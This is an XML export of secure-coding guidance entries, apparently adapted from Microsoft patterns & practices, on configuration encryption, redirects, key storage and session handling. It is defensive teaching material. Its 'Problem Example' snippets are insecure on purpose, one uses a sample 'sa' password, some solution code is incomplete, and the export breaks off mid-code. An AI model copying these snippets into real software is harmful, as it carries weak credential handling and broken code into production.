&lt;p&gt;A suite of web applications on an e-commerce site share a common back-end database.&amp;nbsp; The largest application is&amp;nbsp;the&amp;nbsp;order entry system and shopping cart.&amp;nbsp; This was the first application built, and was designed with the assumption that the database was trusted.&amp;nbsp;
 Later, a lightweight app to allow users to quickly check stock levels was built.&amp;nbsp;&amp;nbsp;When the new application was added, the developers realized that the database could no longer be treated as a trusted data store, and added code to the main application to perform
 data validation on input from the database.&amp;nbsp;&amp;nbsp;&amp;nbsp;Because the new application was a small &amp;quot;read-only&amp;quot; use of the database, the input validation routines written were not properly checked.&amp;nbsp; When an attacker found a SQL injection via the new application and altered
 the back-end database, they were unable to make that attack chain through to the main application.&amp;nbsp; Furthermore, the logging performed by the main application's data validation routines altered the operations group to the problem, allowing them to fix the
 smaller application.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>91872294-7491-4d61-9111-64180e220a3e</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Sensitive Data Inside Configuration Files</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Deployment Considerations</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Protect all sensitive data that is stored within configuration files.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Configuration files are a likely target for any attacker. If an attacker does compromise the configuration files, any unprotected sensitive data inside them will also be compromised.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses configuration files that contain sensitive data such as connection strings, directory paths or credentials, then protect the files.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To protect sensitive data inside configuration files use the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the sensitive data. &lt;/strong&gt;Locate all sensitive data that is stored inside configuration files. Examples of sensitive data include, but are not limited to, credentials, connection strings and directory paths.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt sensitive data inside the configuration files. &lt;/strong&gt;Encrypt the sensitive data inside the configuration file to ensure its confidentiality in case this file is compromised. Once the application accesses the configuration file, it should
 decrypt the sensitive data just before use. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public Properties loadDatabaseCredentials()&lt;br&gt;      throws GeneralSecurityException, IOException{&lt;br&gt;      // Set the decryption mechanism&lt;br&gt;      byte[] rawKey = getEncryptionKey();&lt;br&gt;      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, &amp;quot;AES&amp;quot;);&lt;br&gt;      Cipher cipher = Cipher.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;      cipher.init(Cipher.DECRYPT_MODE, skeySpec);&lt;br&gt; &lt;br&gt;      // Decrypt config file&lt;br&gt; &lt;br&gt;      File configFile = new File(&amp;quot;../../config/testProp.config&amp;quot;);&lt;br&gt;      byte[] tempBuff = new byte[(int)configFile.length()];&lt;br&gt;      FileInputStream fileStream = new FileInputStream(configFile);&lt;br&gt;      fileStream.read(tempBuff, 0, tempBuff.length);&lt;br&gt; &lt;br&gt;      InputStream propStream = new ByteArrayInputStream(cipher.doFinal(tempBuff));&lt;br&gt;      prop.load(propStream);&lt;br&gt;      propStream.close();&lt;br&gt;      fileStream.close();&lt;br&gt; &lt;br&gt;      return prop;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Protect configuration files.&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose a configuration directory&lt;/strong&gt;: Dedicate a directory for storing your application's configuration files. Make sure the directory is not web-accessible. This limits the scope of users&amp;nbsp;who can potentially compromise the contents inside the
 directory.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Set appropriate permissions&lt;/strong&gt;: Apply the appropriate filesystem permissions such that the configuration files can be only accessed by your application and its administrators.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code retrieves database credentials from a configuration file. Unfortunately, the credentials are not encrypted; therefore, anybody with access to the configuration file can retrieve the credentials and access the database on behalf of the
 application.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public Properties loadDatabaseCredentials() throws IOException{&lt;br&gt;      Properties prop = new Properties();&lt;br&gt;      InputStream propStream = new FileInputStream(&amp;quot;../../config/testProp.config&amp;quot;);&lt;br&gt;      prop.load(propStream);&lt;br&gt;      propStream.close();&lt;br&gt; &lt;br&gt;      return prop;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code retrieves database credentials from a configuration file. Because the credentials are encrypted, the application decrypts them in real time, protecting the credentials' confidentiality in case the local access to the configuration file
 is not properly secured.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public Properties loadDatabaseCredentials()&lt;br&gt;      throws GeneralSecurityException, IOException{&lt;br&gt;      // Set the decryption mechanism&lt;br&gt;      byte[] rawKey = getEncryptionKey();&lt;br&gt;      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, &amp;quot;AES&amp;quot;);&lt;br&gt;      Cipher cipher = Cipher.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;      cipher.init(Cipher.DECRYPT_MODE, skeySpec);&lt;br&gt; &lt;br&gt;      // Decrypt config file&lt;br&gt; &lt;br&gt;      File configFile = new File(&amp;quot;../../config/testProp.config&amp;quot;);&lt;br&gt;      byte[] tempBuff = new byte[(int)configFile.length()];&lt;br&gt;      FileInputStream fileStream = new FileInputStream(configFile);&lt;br&gt;      fileStream.read(tempBuff, 0, tempBuff.length);&lt;br&gt; &lt;br&gt;      InputStream propStream = new ByteArrayInputStream(cipher.doFinal(tempBuff));&lt;br&gt;      prop.load(propStream);&lt;br&gt;      propStream.close();&lt;br&gt;      fileStream.close();&lt;br&gt; &lt;br&gt;      return prop;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about the JCE API, see: &lt;a href="http://download.oracle.com/javase/1.4.2/docs/guide/security/jce/JCERefGuide.html"&gt;
Java Cryptography Extension for the Java 2 SDK, v 1.4&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0"&gt;Guideline: Use a Secure Key Storage Location (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EA0D0F4E-A363-4777-9F0D-91E8C5042F9C"&gt;Guideline: Do Not Store Plaintext Sensitive Data (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F"&gt;Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EAD019CA-025A-4DC6-A4DC-6DFDC9FBA131"&gt;Guideline: Disable Directory Browsing (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:809D9208-0247-40FB-B559-A0EA2069E0E0"&gt;Guideline: Protect the JAAS Policy and Configuration Files (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8DC2828C-AD66-46AE-B1D0-1C4C942C86AA"&gt;Checklist Item: Sensitive Data Inside Configuration Files is Protected (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>92f8ce2b-9290-4b24-ab01-24bc0766fd26</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Calculate Destinations of Redirects and Forwards Without User Input</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Calculate destinations of redirects and forwards without user input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using input to calculate destinations of redirects or forwards may allow an attacker to create hyperlinks that appears to point to legitimate sites but redirect to malicious pages controlled by the attacker. This technique is often used by phishers to trick
 people into visiting fake sites that steal authentication credentials.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Perform the following actions to calculate destinations of redirects and forwards without user input:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find redirects and forwards.&lt;/strong&gt; Find all pages that perform redirects or forwards. Redirects are also known as &amp;quot;transfers&amp;quot; in .NET.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify dangerous redirects and forwards.&lt;/strong&gt; Find all redirects and forwards that rely on user input to calculate their destinations.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rewrite redirects and forwards.&lt;/strong&gt; Consider making design or code changes to get rid of each redirect or forward, if possible. If a redirect or forward is absolutely necessary, consider how it may be rewritten to operate without user input
 - this is usually possible based on assumptions made in the application design.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:c2f99851-794e-4cda-a1ee-71447d93bfc8"&gt;Don't Use Redirects or Forwards if Possible&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33"&gt;Validate Destinations of Redirects&amp;nbsp;and Forwards&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9bbdcb27-082d-4d84-ab2f-82da682b8013</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Store Keys  in User-level Key Store for Shared Hosting Environments</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Deployment Considerations</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use user-level key storage if you run your application in a shared hosting environment.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;To ensure that your application's sensitive data is not accessible to other applications on the server.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Use user-level key storage if you run your application in a shared hosting environment. In this scenario, each application should have a separate identity so they all have their own individual and private key stores.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information &lt;a href="http://msdn2.microsoft.com/en-us/library/53tyfkaw.aspx"&gt;
Encrypting Configuration Information Using Protected Configuration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9c905082-0a13-4641-b8cb-28e0bdc710c2</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use RSA-Protected Configuration Provider in Web Farm Environments</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use the RSA Protected Configuration provider to encrypt sections of your configuration files. You can use Aspnet_regiis.exe tool to encrypt sensitive data, such as connection strings, held in the Web.config and Machine.config files.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Connection strings contain sensitive resource access credentials (e.g., a connection string for a SQL server resource includes a username and password.) Connection strings stored in plaintext are dangerous, because an attacker that can compromise a server
 will be able to read those connection strings. Even if a machine is not compromised, connection strings stored in plain text&amp;nbsp;are accessible to administrators and any other users with sufficient privileges&amp;nbsp;on the host machine and/or Windows domain.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Always encrypt connection strings. In&amp;nbsp;a web farm environment,&amp;nbsp;the RSA protected configuration provider is an effective way to encrypt and decrypt configuration file sections&amp;nbsp;because it uses asymmetric encryption to encrypt and decrypt,&amp;nbsp;meaning&amp;nbsp;the keys can
 easily be exported and imported&amp;nbsp;from server to server.&amp;nbsp; If the application is no deployed to a web farm environment DPAPI will work as well as RSA for encrypting connection strings.&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps to encrypt sections of your configuration files: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the configuration sections to be encrypted.&lt;/strong&gt; Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data. In this
 case, we are interested in encrypting the &amp;lt;connectionStrings&amp;gt; element of the Web.config file since that is where the database connection string will reside.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose the machine or user store.&lt;/strong&gt; The DataProtectionConfigurationProvider supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or not your application shares a server with other applications
 and whether or not sensitive data must be kept private for each application. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt your configuration file data.&lt;/strong&gt; Use the RSA Provider to Encrypt a Connection String in Web.config in a Web Farm. To do this, you must create a custom RSA encryption key container and deploy the same key container on all servers in
 your Web farm. This won't work by default because the default RSA encryption key, &amp;quot;NetFrameworkConfigurationKey&amp;quot;, is different for each computer.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;Run&amp;nbsp;the following command from a .NET command prompt to encrypt the connectionStrings section using the machine level store:&lt;/p&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineRSA&amp;quot;&lt;/pre&gt;
&lt;p&gt;Note: If your ASP.NET application identity does not have access to the .NET Framework configuration key store, you'll need to grant access.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;A web application is running in&amp;nbsp;a web farm environment. The application uses an SQL database instance and has sensitive data that should not be accessible to&amp;nbsp;other applications on the same system.&amp;nbsp;The web.config file contains a connectionString section that&amp;nbsp;the
 application uses to access the SQL database across all machines in the farm:&lt;/p&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;  &lt;br&gt;&amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot;        &lt;br&gt;  connectionString=&amp;quot;Initial Catalog=pubs;User Id=sa;Password=asdasd;       &lt;br&gt;  data source=localhost;Integrated Security=SSPI;&amp;quot;      &lt;br&gt;  providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;&lt;/pre&gt;
&lt;p&gt;Unfortunately,&amp;nbsp;anyone capable of reading the web.config file for the application is now able to see the database, the username, and the password for the database instance, and will be able to execute statements at the same level of privilege as the application.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The web.config file for an application running in a web farm environment contains a connectionString section that&amp;nbsp;the application uses to access the SQL database across all machines in the farm:&lt;/p&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;  &lt;br&gt;&amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot;        &lt;br&gt;  connectionString=&amp;quot;Initial Catalog=pubs;User Id=sa;Password=asdasd;       &lt;br&gt;  data source=localhost;Integrated Security=SSPI;&amp;quot;       &lt;br&gt;  providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;&lt;/pre&gt;
&lt;p&gt;Use the RSA Protected Configuration Provider&amp;nbsp;with the&amp;nbsp;machine key&amp;nbsp;store to encypt&amp;nbsp;the connectionStrings section. Add and configure a protected configuration provider to use the&amp;nbsp;machine key&amp;nbsp;store and run the following command from to encrypt the connectionStrings:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineRSA&amp;quot;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;At this point the connection string has been encrypted, which can be verified by looking at the web.config file. There is no need to decrypt the file by hand, since ASP.NET handles this transparently.&amp;nbsp;&amp;lt;&amp;lt;Prashant - The solution does not talk about how the
 keys are exported and imported and used on other machines in the farm&amp;gt;&amp;gt;&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:f10679b7-5390-49ee-b529-7a2f7c059ce7"&gt;Encrypt Connection Strings&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1fe40372-6648-4496-8552-794f91ff6bbf"&gt;Connection Strings are Secured&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9fc08a19-1267-4260-b29a-7afbb5f3ba32</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Your Session State Communication Channel</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Session Management</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Protect the channel to the remote state store via encryption. &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;To ensure the user state remains private and unaltered. &lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If the state service is located on a remote server and you are concerned about the network eavesdropping threat apply this rule.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To protect sensitive session state over the network between the Web server and remote state store, protect the channel to the two servers using IPSec or SSL. This provides privacy and integrity for the session state data across the network. If you use SSL,
 you must install a server certificate on the database server. &lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:f10679b7-5390-49ee-b529-7a2f7c059ce7"&gt;Encrypt Connection Strings&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:39be86fd-65da-4b79-8636-71cbc16e445c"&gt;The Session State Port is Changed from the Default of 42424&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>a32c4cac-014c-4391-a5c1-6f30b318ad32</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Store JSESSIONIDs in the URL When Cookies Are Disabled</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Store the &lt;strong&gt;JSESSIONIDs&lt;/strong&gt; inside the URL when cookies are disabled by the browser.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;JSESSIONIDs&lt;/strong&gt; are the identifiers that match a client to a session. The use of truly random
&lt;strong&gt;JSESSIONID&lt;/strong&gt; makes it difficult for an attacker to hijack the session and impersonate a user.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application supports authentication but cannot use cookies.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;The only information that the browser needs to know once a session has been created for a user is its ID (i.e.
&lt;strong&gt;JSESSIONID&lt;/strong&gt;). &lt;strong&gt;JSESSIONIDs&lt;/strong&gt; should be stored inside cookies. However,
&lt;strong&gt;JSESSIONIDs&lt;/strong&gt; can be stored inside the URL if cookies are disabled. To use
&lt;strong&gt;JSESSIONIDs&lt;/strong&gt; properly:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check if cookies are accepted. &lt;/strong&gt;Verify whether the client has enabled cookies. Store
&lt;strong&gt;JSESSIONIDs&lt;/strong&gt; in cookies if possible; however, if cookies are not enabled, Java allows session IDs to be passed in the URL.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Pass the session ID to the client. &lt;/strong&gt;Use one of the following approaches when passing the
&lt;strong&gt;JSESSIONID&lt;/strong&gt; to the client:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Cookies&lt;/strong&gt;: Cookies are the preferred way of passing &lt;strong&gt;JSESSIONID&lt;/strong&gt; to the browser. The cookie should store only the session identifier and nothing more. All other data should reside inside the server-side session.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;HttpSession session = request.getSession(true);Subject subject = auth.getSubject();session.setAttribute(&amp;quot;AuthUser&amp;quot;, subject);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;URL&lt;/strong&gt;: &lt;strong&gt;JSESSIONIDs&lt;/strong&gt; can also be stored in URLs. This should be a back-up approach that is executed only when cookies are disabled. Adding the session identifier into a URL is done through
&lt;strong&gt;HttpServletResponse.encodeUrl&lt;/strong&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String url = request.getRequestURL().toString();url = response.encodeURL(url);response.sendRedirect(url);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;However, be exceptionally careful when linking to external sites. Because of the HTTP Referer header, the
&lt;strong&gt;JSESSIONID&lt;/strong&gt; can leak out when following a link to an external site. This issue can be mitigated by setting up a forward page where
&lt;strong&gt;JSESSIONIDs&lt;/strong&gt; are stripped from the URL and the user is forwarded to the external site.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code shows the login interaction between the application and the user. Once the user requests the initial page, the application forwards him to the login screen. Upon verifying the credentials, the application loads the main application interface.
 Unfortunately, the application does not check whether the client supports cookies which causes&amp;nbsp;a broken access control, and&amp;nbsp;the valid user may not be able to access the application.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;%-- Filename: /myapp/index.jsp --%&amp;gt;&lt;br&gt;&amp;lt;%-- The application fails to check whether the client supports cookies --%&amp;gt;&lt;br&gt;&amp;lt;jsp:forward page=&amp;quot;/myapp/login.jsp&amp;quot; /&amp;gt;&lt;br&gt;  &lt;br&gt;&amp;lt;%-- Filename: /myapp/login.jsp --%&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;::login&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/auth&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;user&amp;quot; size=&amp;quot;20&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;br&amp;gt;&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;pass&amp;quot; size=&amp;quot;20&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;br&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;log in&amp;quot;&amp;gt;&amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;  /*  Filename: /myapp/auth  */&lt;br&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import 